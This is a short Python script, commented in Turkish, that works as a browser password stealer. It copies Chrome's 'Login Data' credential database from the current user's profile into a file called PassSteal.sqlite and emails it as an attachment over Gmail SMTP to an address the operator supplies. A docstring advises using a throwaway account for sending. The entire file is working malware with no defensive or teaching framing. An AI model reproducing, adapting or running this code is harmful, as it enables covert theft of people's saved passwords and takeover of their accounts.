import os
import shutil
import email, smtplib, ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import os 
username = os.environ.get("USERNAME")
src = "Login Data"
dst = "C:\\Users\\"+username+"\\PassSteal.sqlite"


print(username)

os.chdir("C:\\Users\\"+username+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default")
shutil.copyfile(src, dst)


def Send_Email(username,dst):
    subject = "Kullanıcı Chrome Şifreleri Ektedir"
    body = (username +" İsimli Kullanıcının Şifreleri Ektedir") 
    sender_email = "Buraya Gönderecek Mail Adresini Yazın"
    receiver_email = "Buraya Gidecek Mail Adresini Yazın"
    password = "Buraya Mail Şifresini Yazın"

    """
    Tavsiyem olarak password kısmına kendi şifrenizi yazmayın. Google üstünde Uygulama Şifresi diye aratarak gereken adımları gerçekleştirin ve sadece bu uygulama için
    bir kullanıcı şifresi belirleyin. Ya da hiç kullanmayacağınız bir mail adresi açarak da direkt şifre ile kullanabilirsiniz.
    """

    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject
    message["Bcc"] = receiver_email 
    message.attach(MIMEText(body, "plain"))

    filename = dst

    with open(filename, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    encoders.encode_base64(part)

    # Add header as key/value pair to attachment part
    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {filename}",
    )

    message.attach(part)
    text = message.as_string()

    # Log in to server using secure context and send email
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, text)

Send_Email(username,dst)